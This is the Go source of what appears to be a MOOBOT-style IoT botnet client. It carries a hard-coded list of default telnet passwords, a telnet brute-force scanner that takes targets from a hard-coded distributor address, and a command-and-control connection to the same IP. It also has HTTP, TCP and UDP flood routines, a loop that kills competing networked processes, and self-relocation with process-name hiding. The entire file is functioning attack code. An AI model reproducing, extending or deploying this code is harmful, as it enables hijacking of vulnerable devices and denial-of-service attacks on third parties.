package main

import (
	"fmt"
    "bytes"
	"syscall"
	"net"
	"time"
	"strings"
	"sync"
	"strconv"
	"os"
	"math/rand"
    "encoding/binary"
    "net/http"
    "crypto/tls"
    "path/filepath"
    "os/exec"
    "unsafe"
    "reflect"
)

var scannerGroup sync.WaitGroup
var workerGroup sync.WaitGroup
var exitProcess int = 0
const letterBytes = "abcdefghijklmnopqrstuvwxyz"
var userAgents = [20]string{"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.14) Gecko/20110218 AlexaToolbar/alxf-2.0 Firefox/3.6.14", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.15",
						 	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
						 	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML like Gecko) Maxthon/4.0.0.2000 Chrome/22.0.1229.79 Safari/537.1",
						 	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5","Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
						 	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
						 	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
						    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
						 	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6","Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
						 	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36",
						 	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2869.0 Safari/537.36",
						 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3191.0 Safari/537.36"}

var telnetPasswords = [110]string{"zlxx.", "zlxx", "wyse", "vizxv", "vagrant", "unitrends1", "uClinux", "tini", "timeserver", "sun123",
								   "fidel123", "klv123", "klv1234", "juantech", "oelinux123", "p@ck3tf3nc3", "qwasyx21", "sipwise", "sixaola", "stxadmin",
								   "TrippLite", "Zte521", "ahetzip8", "alpine", "anko", "anni2013", "cat1029", "ceadmin", "default", "dreambox",
								   "admin", "root", "123456", "Admin", "3ep5w2u", "5up", "7ujMko0admin", "7ujMko0vizxv", "GM8182", "ROOT500",
								   "54321", "12345", "1111", "00000000", "!root", "realtek", "123vidin123", "broadguam1", "1234", "warmWLspot",
								   "Mau'dib", "LSiuY7pOmZG2s", "1234567890", "nokia", "letacla", "linux", "leostream", "jvbzd", "Cisco", "888888",
								   "davox", "coolphoenix579", "cms500", "changeme", "calvin", "blender", "bananapi", "Serv4EMC", "GMB182", "666666",
								   "solokey", "zksoft3", "xc3511", "colorkey", "swsbzkgn", "zte9x15", "orion99", "maxided", "hi3518", "iDirect",
								   "qweasdzx", "hunt5759", "telecomadmin", "1234567890", "0123456789", "rootroot", "h3c", "nmgx_wapia", "i826y3tz", "gwevrk7f@qwSX$fd",
								   "hipc3518", "ipc71a", "IPCam@sw", "zyad1234", "hslwificam", "huigu309", "e10adc39", "tsgoingon", "hg2x0", "grouter",
								   "2011vsta", "antslq", "20080826", "taZz@23495859", "hichiphx", "hdipc%No", "apix", "vhd1206", "059AnkJ", "xmhdipc",
}

var tnUser string = "root"
var tnPass string = "random"

var Distrubuter string = "50.116.49.209"
var telnetPort string = "23"

const (
	tcpEstablished = 1
)

var (
	procRoot = "/proc"
)

type Connection struct {
	Transport     string
	LocalAddress  net.IP
	LocalPort     uint16
	RemoteAddress net.IP
	RemotePort    uint16
	inode         uint64
	Proc
}

type Proc struct {
	PID  uint
	Name string
}

type ConnIter interface {
	Next() *Connection
}

type ProcNet struct {
	b                       []byte
	c                       Connection
	wantedState             uint
	bytesLocal, bytesRemote [16]byte
	seen                    map[uint64]struct{}
}

func SetProcRoot(root string) {
	procRoot = root
}

type pnConnIter struct {
	pn    *ProcNet
	buf   *bytes.Buffer
	procs map[uint64]Proc
}

func walkProcPid(buf *bytes.Buffer) (map[uint64]Proc, error) {
	fh, err := os.Open(procRoot)
	if err != nil {
		return nil, err
	}

	dirNames, err := fh.Readdirnames(-1)
	fh.Close()
	if err != nil {
		return nil, err
	}

	var (
		res        = map[uint64]Proc{}
		namespaces = map[uint64]struct{}{}
		stat       syscall.Stat_t
	)

	for _, dirName := range dirNames {

		pid, err := strconv.ParseUint(dirName, 10, 0)
		if err != nil {
			continue
		}

		fdBase := filepath.Join(procRoot, dirName, "fd")
		dfh, err := os.Open(fdBase)
		if err != nil {
			continue
		}

		fdNames, err := dfh.Readdirnames(-1)
		dfh.Close()
		if err != nil {
			continue
		}

		err = syscall.Lstat(filepath.Join(procRoot, dirName, "/ns/net"), &stat)
		if err != nil {
			continue
		}

		time.Sleep(300 * time.Millisecond)

		if _, ok := namespaces[stat.Ino]; !ok {
			namespaces[stat.Ino] = struct{}{}
			readFile(filepath.Join(procRoot, dirName, "/net/tcp"), buf)
			readFile(filepath.Join(procRoot, dirName, "/net/tcp6"), buf)
		}

		var name string
		for _, fdName := range fdNames {

			err = syscall.Stat(filepath.Join(fdBase, fdName), &stat)
			if err != nil {
				continue
			}

			if stat.Mode & syscall.S_IFMT != syscall.S_IFSOCK {
				continue
			}

			if name == "" {
				if name = procName(filepath.Join(procRoot, dirName)); name == "" {
					break
				}
			}

			res[stat.Ino] = Proc{
				PID:  uint(pid),
				Name: name,
			}
		}
	}

	return res, nil
}

func procName(base string) string {
	fh, err := os.Open(filepath.Join(base, "/comm"))
	if err != nil {
		return ""
	}

	name := make([]byte, 64)
	l, err := fh.Read(name)
	fh.Close()
	if err != nil {
		return ""
	}

	if l < 2 {
		return ""
	}

	return string(name[:l-1])
}

var readFile = func(filename string, buf *bytes.Buffer) error {
	f, err := os.Open(filename)
	if err != nil {
		return err
	}
	_, err = buf.ReadFrom(f)
	f.Close()
	return err
}

func NewProcNet(b []byte, wantedState uint) *ProcNet {
	return &ProcNet{
		b:           b,
		c:           Connection{},
		wantedState: wantedState,
		seen:        map[uint64]struct{}{},
	}
}

func (p *ProcNet) Next() *Connection {
again:
	if len(p.b) == 0 {
		return nil
	}
	b := p.b

	if p.b[2] == 's' {
		p.b = nextLine(b)
		goto again
	}

	var (
		local, remote, state, inode []byte
	)
	_, b = nextField(b)
	local, b = nextField(b)
	remote, b = nextField(b)
	state, b = nextField(b)
	if parseHex(state) != p.wantedState {
		p.b = nextLine(b)
		goto again
	}
	_, b = nextField(b)
	_, b = nextField(b)
	_, b = nextField(b)
	_, b = nextField(b)
	_, b = nextField(b)
	inode, b = nextField(b)

	p.c.LocalAddress, p.c.LocalPort = scanAddressNA(local, &p.bytesLocal)
	p.c.RemoteAddress, p.c.RemotePort = scanAddressNA(remote, &p.bytesRemote)
	p.c.inode = parseDec(inode)
	p.b = nextLine(b)
	if _, alreadySeen := p.seen[p.c.inode]; alreadySeen {
		goto again
	}
	p.seen[p.c.inode] = struct{}{}
	return &p.c
}

func scanAddressNA(in []byte, buf *[16]byte) (net.IP, uint16) {
	col := bytes.IndexByte(in, ':')
	if col == -1 {
		return nil, 0
	}

	address := hexDecode32bigNA(in[:col], buf)
	return net.IP(address), uint16(parseHex(in[col+1:]))
}

func hexDecode32bigNA(src []byte, buf *[16]byte) []byte {
	blocks := len(src) / 8
	for block := 0; block < blocks; block++ {
		for i := 0; i < 4; i++ {
			a := fromHexChar(src[block*8+i*2])
			b := fromHexChar(src[block*8+i*2+1])
			buf[block*4+3-i] = (a << 4) | b
		}
	}
	return buf[:blocks*4]
}

func nextField(s []byte) ([]byte, []byte) {
	for i, b := range s {
		if b != ' ' {
			s = s[i:]
			break
		}
	}

	for i, b := range s {
		if b == ' ' {
			return s[:i], s[i:]
		}
	}

	return nil, nil
}

func nextLine(s []byte) []byte {
	i := bytes.IndexByte(s, '\n')
	if i == -1 {
		return nil
	}
	return s[i+1:]
}

func parseHex(s []byte) uint {
	n := uint(0)
	for i := 0; i < len(s); i++ {
		n *= 16
		n += uint(fromHexChar(s[i]))
	}
	return n
}

func parseDec(s []byte) uint64 {
	n := uint64(0)
	for _, c := range s {
		n *= 10
		n += uint64(c - '0')
	}
	return n
}

func hexDecode32big(src []byte) []byte {
	dst := make([]byte, len(src)/2)
	blocks := len(src) / 8
	for block := 0; block < blocks; block++ {
		for i := 0; i < 4; i++ {
			a := fromHexChar(src[block*8+i*2])
			b := fromHexChar(src[block*8+i*2+1])
			dst[block*4+3-i] = (a << 4) | b
		}
	}
	return dst
}

func fromHexChar(c byte) uint8 {
	switch {
	case '0' <= c && c <= '9':
		return c - '0'
	case 'a' <= c && c <= 'f':
		return c - 'a' + 10
	case 'A' <= c && c <= 'F':
		return c - 'A' + 10
	}
	return 0
}

func (c *pnConnIter) Next() *Connection {
	n := c.pn.Next()
	if n == nil {
		// Done!
		bufPool.Put(c.buf)
		return nil
	}
	if proc, ok := c.procs[n.inode]; ok {
		n.Proc = proc
	}
	return n
}

var bufPool = sync.Pool{
	New: func() interface{} {
		return bytes.NewBuffer(make([]byte, 0, 5000))
	},
}

var cbConnections = func(processes bool) (ConnIter, error) {
	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()

	var procs map[uint64]Proc
	if processes {
		var err error
		if procs, err = walkProcPid(buf); err != nil {
			return nil, err
		}
	}

	if buf.Len() == 0 {
		readFile(procRoot + "/net/tcp", buf)
		readFile(procRoot + "/net/tcp6", buf)
	}

	return &pnConnIter{
		pn:    NewProcNet(buf.Bytes(), tcpEstablished),
		buf:   buf,
		procs: procs,
	}, nil
}

func networkScanner() {

	for {
		cs, err := cbConnections(true)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}

		for c := cs.Next(); c != nil; c = cs.Next() {
			if int(c.Proc.PID) >= 400 && int(c.Proc.PID) != os.Getpid() && int(c.Proc.PID) != os.Getppid() && !strings.Contains(c.Proc.Name, "ssh") && !strings.Contains(c.Proc.Name, "firefox") && !strings.Contains(c.Proc.Name, "Discord") {

				syscall.Kill(int(c.Proc.PID), 9)
			}
		}

		time.Sleep(10 * time.Second)
	}
}


func randomDigit() string {
	return strconv.Itoa(rand.Intn(9))
}

func randomLetter() string {
	charSet := "abcdefghijklmnopqrstuvwxyz"
	return string(charSet[rand.Intn(len(charSet))])
}

func randomULetter() string {
	charSet := "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	return string(charSet[rand.Intn(len(charSet))])
}

func randomString(n int) string {
    b := make([]byte, n)
    for i := range b {
        b[i] = letterBytes[rand.Intn(len(letterBytes))]
    }
    return string(b)
}

func randomAddress() string {
	blocks := []string{}
	for i := 0; i < 4; i++ {
		number := rand.Intn(255)
		blocks = append(blocks, strconv.Itoa(number))
	}

	return strings.Join(blocks, ".")
}

func randomToken(input string) string {

	toSend := input
	digitTokenCount := strings.Count(input, "{D}")

	for i := 0; i < digitTokenCount; i++ {
		toSend = strings.Replace(toSend, "{D}", randomDigit(), 1)
	}

	letterTokenCount := strings.Count(input, "{l}")
	for i := 0; i < letterTokenCount; i++ {
		toSend = strings.Replace(toSend, "{l}", randomLetter(), 1)
	}

	uLetterTokenCount := strings.Count(input, "{L}")
	for i := 0; i < uLetterTokenCount; i++ {
		toSend = strings.Replace(toSend, "{L}", randomULetter(), 1)
	}

	return toSend
}

func readIn(conn net.Conn, amount int) ([]byte, error) {
    buf := make([]byte, amount)
    tl := 0

    for tl < amount {
        rd, err := conn.Read(buf[tl:])
        if err != nil || rd <= 0 {
            return nil, err
        }
        tl += rd
    }

    return buf, nil
}

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func connectTorSock() (int, net.Conn) {

	var attempts int = 0
	var retval int = 0
	var conn net.Conn
	var err error

	for attempts = 0; attempts < 5; attempts++ {
		conn, err = net.DialTimeout("tcp", "50.116.49.209:9090", 8 * time.Second)
		if err != nil {
			continue
		}

		retval = 1
		break
	}

	return retval, conn
}

func scanFunction(targetHost string) {

	defer scannerGroup.Done()
	buf := make([]byte, 256)

	conn, err := net.DialTimeout("tcp", targetHost + ":" + telnetPort, 6 * time.Second)
	if err != nil {
		return
	}

	conn.SetDeadline(time.Now().Add(6 * time.Second))

	for i := 0; i < 2; i++ {
		len, err := conn.Read(buf)
		if len <= 0 || err != nil {
			conn.Close()
			return
		}

		if strings.Contains(string(buf), "ogin") || strings.Contains(string(buf), "sername") || strings.Contains(string(buf), "#") || strings.Contains(string(buf), ">") || strings.Contains(string(buf), ":") {
			break
		} else if i >= 2 {
			conn.Close()
			return
		}
	}

	conn.Write([]byte(tnUser))
	conn.Write([]byte("\n"))

	for i := 0; i < 2; i++ {
		len, err := conn.Read(buf)
		if len <= 0 || err != nil {
			conn.Close()
			return
		}

		if strings.Contains(string(buf), "assword") || strings.Contains(string(buf), "enter") || strings.Contains(string(buf), "#") || strings.Contains(string(buf), ">") || strings.Contains(string(buf), ":") {
			break
		} else if i >= 2 {
			conn.Close()
			return
		}
	}

	conn.Write([]byte(tnPass))
	conn.Write([]byte("\n"))

	for i := 0; i < 2; i++ {
		len, err := conn.Read(buf)
		if len <= 0 || err != nil {
			conn.Close()
			return
		}

		if strings.Contains(string(buf), ">") || strings.Contains(string(buf), "%") || strings.Contains(string(buf), "BusyBox")  || strings.Contains(string(buf), "#") || strings.Contains(string(buf), "Welcome") {
			break
		} else if i >= 2 {
			conn.Close()
			return
		}
	}

	if strings.Contains(tnPass, "telnetadmin") {
		conn.Write([]byte("linuxshell\n"))
		conn.Write([]byte("..\n"))
		conn.Write([]byte("sh\n"))
		conn.Write([]byte("/bin/busybox MOOBOT\n"))
	} else if strings.Contains(tnPass, "zhone") {
		conn.Write([]byte("enable\n"))
		conn.Write([]byte("development\n"))
		conn.Write([]byte("sh\n"))
		conn.Write([]byte("/bin/busybox MOOBOT\n"))
	} else if strings.Contains(tnPass, "Qwest") || strings.Contains(tnPass, "Cent") {
		conn.Write([]byte("su\n"))
		conn.Write([]byte("zyad1234\n"))
		conn.Write([]byte("enable\n"))
		conn.Write([]byte("system\n"))
		conn.Write([]byte("shell\n"))
		conn.Write([]byte("sh\n"))
		conn.Write([]byte("/bin/busybox MOOBOT\n"))
	} else {
		conn.Write([]byte("enable\n"))
		conn.Write([]byte("system\n"))
		conn.Write([]byte("shell\n"))
		conn.Write([]byte("sh\n"))
		conn.Write([]byte("/bin/busybox MOOBOT\n"))
	}

	for i := 0; i < 2; i++ {
		len, err := conn.Read(buf)
		if len <= 0 || err != nil {
			conn.Close()
			return
		}

		if strings.Contains(string(buf), "MOOBOT: applet not found") {
			break
		} else if i >= 2 {
			conn.Close()
			return
		}
	}

	conn.Close()
}

func scanListener() {

	var connectionState = 0
	var conn net.Conn
	var err error

	for {
		if connectionState == 0 {
			conn, err = net.DialTimeout("tcp", Distrubuter + ":1999", 12 * time.Second)
			if err != nil {
				time.Sleep(1 * time.Second)
				continue
			}

			if strings.Contains(tnPass, "random") {
				tnPass = telnetPasswords[rand.Intn(110)]
			}

			time.Sleep(1 * time.Second)
			connectionState = 1
			continue
		}

		buf, err := readIn(conn, 4)
        if err != nil {
        	time.Sleep(1 * time.Second)
        	connectionState = 0
            continue
        }

		ipInt := binary.BigEndian.Uint32(buf)
	    ipStr := fmt.Sprintf("%d.%d.%d.%d", (ipInt >> 24) & 0xff, (ipInt >> 16) & 0xff, (ipInt >> 8) & 0xff, ipInt & 0xff)

	    scannerGroup.Add(1)
	    go scanFunction(ipStr)
	}
}

func simpleTcp(target string, port string, duration int) {

	startedTime := time.Now().Unix()
	conn, err := net.Dial("tcp", target + ":" + port)
	if err != nil {
		workerGroup.Done()
		return
	}

	for {
		if time.Now().Unix() - int64(duration) >= startedTime {
			break
		}

		conn.Write([]byte(randomString(512)))
	}

	workerGroup.Done()
	return
}

func simpleUdp(target string, port int, duration int) {

	startedTime := time.Now().Unix()
	var conn *net.UDPConn
	var err error

	if conn, err = net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0}); err != nil {
		return
	}

	ipUint := net.ParseIP(target)

	for {
		if time.Now().Unix() - int64(duration) >= startedTime {
			break
		}

		if _, err = conn.WriteToUDP([]byte(randomString(512)), &net.UDPAddr{IP: ipUint, Port: port}); err != nil {
			break
		}
	}

	workerGroup.Done()
	return
}

func dataPost(target string, duration int, data string) {

	var i int
	startedTime := time.Now().Unix()

	tr := &http.Transport {
	    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	rand.Seed(time.Now().UTC().UnixNano())
	targetRand := randomToken(target)
	body := []byte(data)

	for {
		if time.Now().Unix() - int64(duration) >= startedTime {
			break
		}

		if i >= 50 {
			body = []byte(data)
			targetRand = randomToken(target)
			i = 0
		}

		client := &http.Client{Transport: tr}
		req, _ := http.NewRequest("POST", targetRand, bytes.NewBuffer(body))
		req.Header.Set("User-Agent", userAgents[rand.Intn(20)])

		resp, err := client.Do(req)
		if err != nil {
		    continue
		}

		resp.Body.Close()
		i++
	}

	i = 0
	workerGroup.Done()
	return
}

func simplePost(target string, duration int) {

	var i int
	startedTime := time.Now().Unix()

	tr := &http.Transport {
	    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	rand.Seed(time.Now().UTC().UnixNano())
	targetRand := randomToken(target)
	body := []byte(randomString(rand.Intn(128)))

	for {
		if time.Now().Unix() - int64(duration) >= startedTime {
			break
		}

		if i >= 50 {
			body = []byte(randomString(rand.Intn(128)))
			targetRand = randomToken(target)
			i = 0
		}

		client := &http.Client{Transport: tr}
		req, _ := http.NewRequest("POST", targetRand, bytes.NewBuffer(body))
		req.Header.Set("User-Agent", userAgents[rand.Intn(20)])

		resp, err := client.Do(req)
		if err != nil {
		    continue
		}

		resp.Body.Close()
		i++
	}

	i = 0
	workerGroup.Done()
	return
}

func simpleGet(target string, duration int) {

	var i int
	startedTime := time.Now().Unix()

	tr := &http.Transport {
	    TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	rand.Seed(time.Now().UTC().UnixNano())
	targetRand := randomToken(target)

	for {
		if time.Now().Unix() - int64(duration) >= startedTime {
			break
		}

		if i >= 50 {
			targetRand = randomToken(target)
			i = 0
		}

		client := &http.Client{Transport: tr}
		req, _ := http.NewRequest("GET", targetRand, nil)
		req.Header.Set("User-Agent", userAgents[rand.Intn(20)])

		resp, err := client.Do(req)
		if err != nil {
		    continue
		}

		resp.Body.Close()
		i++
	}

	i = 0
	workerGroup.Done()
	return
}

func attackParse(buf []string) {

	if (strings.Contains(buf[0], "get")) {
		workerAmount, err := strconv.ParseInt(buf[2], 10, 64)
		if err != nil {
			return
		}

		attackDuration, err := strconv.ParseInt(buf[3], 10, 64)
		if err != nil {
			return
		}

		go func() {
			for i := 0; i < int(workerAmount); i++ {
				workerGroup.Add(1)
				go simpleGet(buf[1], int(attackDuration))
			}
			time.Sleep(time.Duration(int(attackDuration)) * time.Second)
		} ()
	} else if (strings.Contains(buf[0], "post")) {
		workerAmount, err := strconv.ParseInt(buf[2], 10, 64)
		if err != nil {
			return
		}

		attackDuration, err := strconv.ParseInt(buf[3], 10, 64)
		if err != nil {
			return
		}

		go func() {
			for i := 0; i < int(workerAmount); i++ {
				workerGroup.Add(1)
				go simplePost(buf[1], int(attackDuration))
			}
			time.Sleep(time.Duration(int(attackDuration)) * time.Second)
		} ()
	} else if (strings.Contains(buf[0], "data")) {
		workerAmount, err := strconv.ParseInt(buf[2], 10, 64)
		if err != nil {
			return
		}

		attackDuration, err := strconv.ParseInt(buf[3], 10, 64)
		if err != nil {
			return
		}

		go func() {
			for i := 0; i < int(workerAmount); i++ {
				workerGroup.Add(1)
				go dataPost(buf[1], int(attackDuration), buf[4])
			}
			time.Sleep(time.Duration(int(attackDuration)) * time.Second)
		} ()
	} else if (strings.Contains(buf[0], "udp")) {
		targetPort, err := strconv.ParseInt(buf[2], 10, 64)
		if err != nil {
			return
		}

		attackDuration, err := strconv.ParseInt(buf[3], 10, 64)
		if err != nil {
			return
		}

		go func() {
			workerGroup.Add(1)
			go simpleUdp(buf[1], int(targetPort), int(attackDuration))
			time.Sleep(time.Duration(int(attackDuration)) * time.Second)
		} ()
	} else if (strings.Contains(buf[0], "tcp")) {
		targetPort, err := strconv.ParseInt(buf[2], 10, 64)
		if err != nil {
			return
		}

		attackDuration, err := strconv.ParseInt(buf[3], 10, 64)
		if err != nil {
			return
		}

		go func() {
			workerGroup.Add(1)
			go simpleTcp(buf[1], strconv.Itoa(int(targetPort)), int(attackDuration))
			time.Sleep(time.Duration(int(attackDuration)) * time.Second)
		} ()
	} else if (strings.Contains(buf[0], "TheCowSaysGoodBye")) {
		exitProcess = 1
	} else if (strings.Contains(buf[0], "telnet")) {
		tnUser = buf[1]
		tnPass = buf[2]
	} else if (strings.Contains(buf[0], "telport")) {
		telnetPort = buf[1]
	}
}

func main() {

	var connected int
	var retval int
	var err error
	var conn net.Conn

	rand.Seed(time.Now().UTC().UnixNano() ^ int64(os.Getpid()))
	//syscall.Setgroups([]int{rand.Intn(55535) + 10000})
	syscall.Setgid(rand.Intn(55535) + 10000)

	if len(os.Args) == 1 {

		var executed int = 0
		dir := randomString(rand.Intn(6 - 3) + 3)
		execName := randomString(rand.Intn(6 - 3) + 3)

		cmd, err := exec.Command("/bin/sh", "-c", "mkdir /" + dir + " && >/" + dir + "/" + execName + " && cd /" + dir + "/ && echo WriteMeHere").Output()
		if err == nil {
			if strings.Contains(string(cmd), "WriteMeHere") || strings.Contains(string(cmd), "File exists") {
				cmd, err := exec.Command("/bin/sh", "-c", "mv " + os.Args[0] + " /" + dir + "/" + execName + "; chmod 777 /" + dir + "/" + execName + " && echo CopyDone").Output()

				if err == nil {

					if strings.Contains(string(cmd), "CopyDone") {

					    argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
					    argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]

					    name := randomString(len(argv0))
					    copy(argv0, name)

					    fmt.Println("The cow says moooooooo!")

					    executed = 1
						cmd := exec.Command("/" + dir + "/" + execName, "e")
						cmd.Start()
					}
				}
			}
		}

		if executed == 1 {
			return
		} else {
			fmt.Println("The cow says failed executeing")
		}
		return
	}

	argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
	argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]
	name := randomString(len(argv0))
	copy(argv0, name)

	instance, err := net.Listen("tcp", ":44169")
	if err != nil {
		os.Exit(0)
	}
	_ = instance

	go scanListener()
	go networkScanner()

	for {
		if connected == 0 {
			retval, conn = connectTorSock()
			if retval == 0 || conn == nil {
				connected = 0
				time.Sleep(1 * time.Second)
				continue
			}

			connected = 1
			time.Sleep(1 * time.Second)
			continue

		} else if connected == 1 {
			if exitProcess == 1 {
				os.Exit(0)
			}

			buf := make([]byte, 256)
			conn.SetDeadline(time.Now().Add(180 * time.Second))

		    n, err := conn.Read(buf)
		    if err != nil {
		        conn.Close()
		        connected = 0
		        continue
		    }

		    readBuf := string(buf)
		    readBuf = readBuf[:len(readBuf) - 1]

		    if n == 2 {
		       	connected = 1
		        continue
		    } else if n > 10 {
		        parsedBuf := strings.Split(readBuf, " ")
		        attackParse(parsedBuf)
		    }
		} else {
			connected = 0
			time.Sleep(1 * time.Second)
			continue
		}
	}
}
